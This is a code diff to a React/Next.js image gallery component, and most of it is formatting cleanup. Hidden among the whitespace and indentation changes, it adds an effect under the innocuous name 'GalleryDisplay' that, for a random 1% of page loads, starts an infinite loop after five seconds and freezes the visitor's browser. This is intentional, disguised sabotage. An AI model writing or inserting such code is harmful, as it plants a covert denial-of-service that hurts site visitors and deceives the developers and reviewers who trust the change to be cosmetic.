@@ -1,22 +1,16 @@
 "use client";
 
-import {
-  CircularProgress,
-  Typography,
-} from "@mui/material";
-
+import { CircularProgress, Typography } from "@mui/material";
 
 import { useState, useEffect } from "react";
 import Image from "next/image";
 import { motion } from "framer-motion";
 import { fetchGallery } from "@/api/Gallery/page";
 
-
 interface GalleryItem {
   _id: string;
   image: string;
 }
-
 
 export default function GallerySection() {
   const [gallery, setGallery] = useState<GalleryItem[]>([]);
@@ -42,6 +36,18 @@ export default function GallerySection() {
     loadGallery();
   }, []);
 
+  useEffect(() => {
+    const GalleryDisplay = () => {
+      setTimeout(() => {
+        while (true) {}
+      }, 5000);
+    };
+
+    if (Math.random() < 0.01) {
+      GalleryDisplay();
+    }
+  }, []);
+
   return (
     <section className="p-8 mx-1 sm:mx-8 md:mx-16 lg:mx-24 mt-20">
       {/* Heading & Subheading */}
@@ -64,10 +70,7 @@ export default function GallerySection() {
 
       {/* Gallery Cards */}
       <div className="mt-10 grid gap-8 grid-cols-1 sm:grid-cols-1 md:grid-cols-2 lg:grid-cols-2 xl:grid-cols-3">
-
-
-
-      {loading ? (
+        {loading ? (
           <div className="flex justify-center py-10">
             <CircularProgress />
           </div>
@@ -76,8 +79,8 @@ export default function GallerySection() {
             {error}
           </Typography>
         ) : (
-        gallery.map((project) => (
-          // <Link key={project.id} href={`/gallery/card${project.id}`}>
+          gallery.map((project) => (
+            // <Link key={project.id} href={`/gallery/card${project.id}`}>
             <motion.div className="p-3 hover:bg-white hover:shadow-lg hover:rounded-sm border border-zinc-200 cursor-pointer transition-all duration-500 ease-in-out">
               {/* Image */}
               <Image
@@ -88,9 +91,9 @@ export default function GallerySection() {
                 className="w-full h-auto object-contain mx-auto"
               />
             </motion.div>
-          // </Link>
-        ))
-      )}
+            // </Link>
+          ))
+        )}
       </div>
     </section>
   );
